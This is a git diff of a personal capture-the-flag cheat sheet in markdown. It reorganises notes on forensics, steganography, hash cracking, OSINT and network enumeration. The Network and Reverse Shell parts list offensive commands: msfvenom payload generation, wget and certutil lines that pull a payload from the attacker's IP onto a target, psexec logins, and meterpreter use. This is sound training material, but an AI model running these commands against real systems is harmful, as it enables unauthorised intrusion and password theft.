@@ -1,20 +1,22 @@
 # CTF-Notes
 
-## How to connect to the vpn
+## General 
+
+### How to connect to the vpn
 
 ```sudo openvpn [YOUR .ovpn FILE]```
 
-## How to check if we are properly connected?
+### How to check if we are properly connected?
 
 ```ping [IP]```
 
-## Get my IP
+### Get my IP
 
 ```ip a``` or ```ifconfig``` 
 
 If we only want tun0 ```ifconfig tun0```
 
-## Where to find all the useful stuff in Kali Linux
+### Where to find all the useful stuff in Kali Linux
 
 > /usr/share/ 
 
@@ -22,7 +24,150 @@ For downloaded stuff
 
 > /opt/
 
-## PORTS
+### Check if input allows python/python3
+
+We can do ```python -c "print('Hello')"``` or ```python3 -c "print('Hello')"```
+
+### Make a python script executable from command line
+
+ 1. Add ```#!/usr/bin/env python``` at the beginning of the script
+ 2. Execute the file ```python myfile.py```
+	 1. Or Make the file executable ```chmod +x myfile.py```
+	 2. Execute the script ```./myfile.py```
+
+### Check for hidden files
+
+#### Linux 
+- ```ls -la```
+
+### If commands like "cat" are not allowed
+
+We can use ```grep . file``` or ```while read line; do echo $line; done < file```
+
+## Forensics
+
+-  ```strings [FILE]``` see all the strings inside the file
+- ```hexdump [FILE]```  see the hex of the file 
+-  ```hexedit [FILE]```  modify the hex of a file
+-  ```file [FILE]```  see the type of file
+-  ```exiftool [FILE]``` see metadata of file
+-  ```foremost [FILE]``` see if there are other files inside the file
+-  ```Binwalk [FILE]``` Binwalk is a tool for searching binary files like images and audio files for embedded files and data.
+	- With the -e flag it will also extract the files
+- Stegsolve is also a good tool to apply modifications into an image [Github](https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve/stegsolve)
+### Images
+
+##### JPG
+
+If after running ```strings``` on the file we see a line like 
+> ()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
+  #3R
+&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
+
+The file contains hidden information using steganography
+
+We can use ```steghide``` to extract the information if the file does not have a password
+
+```steghide extract -sf [FILE]```
+
+If the file has a password we can use ```stegseek```
+
+```stegseek [FILE] [wordlist]```
+
+##### PNG
+
+```pngcheck [FILE]``` see what is wrong with the file
+```zsteg -a [FILE]``` see hidden data 
+
+##### BMP
+
+```zsteg -a [FILE]``` see hidden data 
+
+### Videos
+
+```mediainfo [FILE]``` see metadata of video
+
+### MC Office Documents
+
+MC Office Documents are pretty much zip files, so we can unzip them 
+
+```unzip [FILE]```
+
+They can also have macros, we can check them with ```olevba```
+
+```olevba [options] <filename>```
+
+### Audio Files
+
+We can use tools like "Audacity" or "Sonic Visualizer"
+
+### Network Capture files
+
+Use Wireshark
+
+We can always right click in a package -> Follow [PACKAGE TYPE]  Stream
+
+We can extract files in File > Export > Objects > Http [More info](https://www.rubyguides.com/2012/01/four-ways-to-extract-files-from-pcaps/)
+
+##### Adding a key file 
+
+We need to add the key file into WireShark
+
+> EDIT => PREFERENCES => PROTOCOLS => TLS => (Pre)-Master-Secret Log filename
+
+##### To crack WIFI Passwords
+
+```aircrack-ng -w [WORDLIST] -b [MAC ADDRS] [CAP FILE]```
+
+### ZipFiles
+
+We can crack ZipFiles passwords using Jhon 
+
+```
+zip2john [ZIPFILE] > hash.txt
+john --wordlist=[WORDLIST] hash.txt
+```
+
+## Criptography
+
+When in doubt use [Cyberchef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)) 
+
+### Base 64
+
+If we see a combination of letters and numbers, it may be Base 64 encoding, the best way to find out if it contains at least one '=' at the end.
+
+```echo [BASE64 STRING] | base64 -d``` 
+
+### Hashes
+
+### Finding type of hash
+
+- https://md5decrypt.net/en/HashFinder/
+- https://www.tunnelsup.com/hash-analyzer/
+- ```hash-identifier```
+
+### Crack them
+
+- https://crackstation.net/
+- Hashcat - If we are given a hash we can use hashcat to try and break it
+	- Dictionary attack ```hashcat -m [Module] hash.txt [Wordlist]```
+	- Brute Force attack ```hashcat -m [Module] hash.txt [Pattern]```
+	- [List of available modules and formats](https://hashcat.net/wiki/doku.php?id=example_hashes)
+	- [More on brute force attacks](https://hashcat.net/wiki/doku.php?id=mask_attack)
+- John - You can also use John to break some hashes
+
+### OSINT
+
+We can find almost any OSINT tool that we might want [here](https://osintframework.com/)
+
+#### Images
+
+- We can reverse search the image to look for more info (We can use the ["Search by Image"](https://addons.mozilla.org/es/firefox/addon/search_by_image/) extension for this)
+- We can also try to look at the metadata ```exiftool [Image]```
+
+## Network
+
+### PORTS
 
 * **Check for open ports:** 
 	* ```nmap -sV -sC [IP]``` or ``` nmap [IP]``` 
@@ -30,8 +175,8 @@ For downloaded stuff
 	* or with only top 10000 ports   ```namp -T4 -A [IP]```
 	* [Guide](https://www.stationx.net/nmap-cheat-sheet/)
 
-### Types of ports and how to access them:
- #### Port 80 (HTTP)
+#### Types of ports and how to access them:
+ ##### Port 80 (HTTP)
  - Usually HTTP 
 	 - **Enumerate Directories**
 		  * ```gobuster dir -u "[URL | IP]" -w [Wordlist] ``` [Guide](https://redteamtutorials.com/2018/11/19/gobuster-cheatsheet/)
@@ -39,7 +184,7 @@ For downloaded stuff
 	- **Find URL information**
 		-  ```enum4linux -A [IP | URL]```
  
-  #### Port 22 (SSH)
+  ##### Port 22 (SSH)
   
  -  Usually ssh [Guide](https://phoenixnap.com/kb/linux-ssh-commands)
     - ** You can connect to ssh using the command ```ssh```**
@@ -61,8 +206,7 @@ For downloaded stuff
     * **Send a file to SSH**
 		*  ```scp [FILE] [user]@[IP]:/dev/shm```
 
-
-  ### **Port 21:** (FTP)
+  #### **Port 21:** (FTP)
    * Usually FTP
 	   * **You can connect to FTP using the command** ```ftp```
       * ```ftp [IP]```
@@ -75,7 +219,7 @@ For downloaded stuff
 			- ```put [FILE]```
 			
  
- ### **Port 445/139**  (SMB)
+ #### **Port 445/139**  (SMB)
  
  - Usually SMB
 	 - **Find SMB version***
@@ -93,30 +237,11 @@ For downloaded stuff
     - **We can retrieve files using**
 		-  ```get [file]```
 	
- ### **Port 135**  (RTC)
+ #### **Port 135**  (RTC)
  
  - **Get RTC Info**
 	 - ```rpcinfo -p [IP]```
-## Check if input allows python/python3
 
-We can do ```python -c "print('Hello')"``` or ```python3 -c "print('Hello')"```
-
-## Make a python script executable from command line
-
- 1. Add ```#!/usr/bin/env python``` at the beginning of the script
- 2. Execute the file ```python myfile.py```
-	 1. Or Make the file executable ```chmod +x myfile.py```
-	 2. Execute the script ```./myfile.py```
-
-## Check for hidden files
-
-### Linux 
-- ```ls -la```
-
-## If commands like "cat" are not allowed
-
-We can use ```grep . file``` or ```while read line; do echo $line; done < file```
-  
 ## Reverse Shell
 
 * If a website allows input or file upload without sanitation it will be possible to upload a reverse shell in order to gain access to the system.
@@ -131,7 +256,7 @@ We can use ```grep . file``` or ```while read line; do echo $line; done < file``
 4. ```fg```
 5. ```export TERM=xterm```
 
-## Creating a  Payload with Msfvenom 
+## Creating a Payload with Msfvenom 
 
 - ```msfvenom -p [Type of payload] LHOST=[Your listening host] LPORT=[Your listening port] -f [Type of file] > [Name of file to be created]```
 - [Cheatsheet](https://netsec.ws/?p=331)
@@ -166,11 +291,11 @@ We can use ```grep . file``` or ```while read line; do echo $line; done < file``
 	- ```ps```
 	- ```migrate [process number]```
       
-## Find all files in system by name.
+### Find all files in system by name.
 
 - We can do ```find / -name [FILENAME]``` or ```find /* | grep [FILENAME]```
 
-## Search For possible Exploits
+### Search For possible Exploits
 - Just the information
 	- ```searchsploit [System Info]```
 - Find and execute them
@@ -180,25 +305,25 @@ We can use ```grep . file``` or ```while read line; do echo $line; done < file``
 	- ```set options```
 	- ```run```
 
-## Set up python server to deliver payload
+### Set up python server to deliver payload
 - ```python -m SimpleHTTPServer [Port]```
 	- The server will be created in the location where we called the command
 
-## Get payload on the shell
-### Linux
+### Get payload on the shell
+#### Linux
 - ```wget http://[YOUR IP]/[PAYLOAD]```
 
-### Windows
+#### Windows
 - ```certutil -urlcache -f [Your Server with the file] [Where you want to put the file in the machine]```
 
-## Connect to user in machine 
+### Connect to user in machine 
 - We can use psexec
 	- You can use the one in metasploit 
 	- You can use the one by [impacket](https://github.com/SecureAuthCorp/impacket)
 		-``` psexec.py [User]:'[Password]'@[IP]```
 
-## Meterpreter useful commands
-### Commands
+### Meterpreter useful commands
+#### Commands
 
 See **user privilege** (NT AUTHORITY\SYSTEM == Highest):
 
@@ -246,65 +371,3 @@ shell
 	```
 	type [File Name]
 	```
-	
-## Criptography
-
-* **Base 64:** If we see a combination of letters and numbers, it may be Base 64 encoding, the best way to find out if it contains at least one '=' at the end.
-  * How to decode:
-    * In linux: ```echo [BASE64 STRING] | base64 -d``` 
-    * Online: [Cyberchef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true))
-
-## Forensics
-
--  ```strings [FILE]``` see all the strings inside the file
-- ```hexdump [FILE]```  see the hex of the file 
--  ```hexedit [FILE]```  modify the hex of a file
--  ```file [FILE]```  see the type of file
--  ```exiftool [FILE]``` see metadata of file
-### Images
-
-##### JPG
-
-If after running ```strings``` on the file we see a line like 
-> ()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
-  #3R
-&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
-
-The file contains hidden information using steganography
-
-We can use ```steghide``` to extract the information if the file does not have a password
-
-```steghide extract -sf [FILE]```
-
-If the file has a password we can use ```stegcracker```
-
-```stegcracker [FILE] [wordlist]```
-
-##### PNG
-
-```pngcheck [FILE]``` see what is wrong with the file
-
-### Videos
-
-```mediainfo [FILE]``` see metadata of video
-```foremost [FILE]``` see if there are other videos inside the video
-
-### Excel Documents
-
-Excel Documents are pretty much zip files, so we can unzip them 
-
-```unzip [FILE]```
-
-### Audio Files
-
-We can use tools like "Audacity" or "Sonic Visualizer"
-
-### Wireshark
-
-We can always right click in a package -> Follow [PACKAGE TYPE]  Stream
-
-##### Adding a key file 
-
-We need to add the key file into WireShark
-
-> EDIT => PREFERENCES => PROTOCOLS => TLS => (Pre)-Master-Secret Log filename
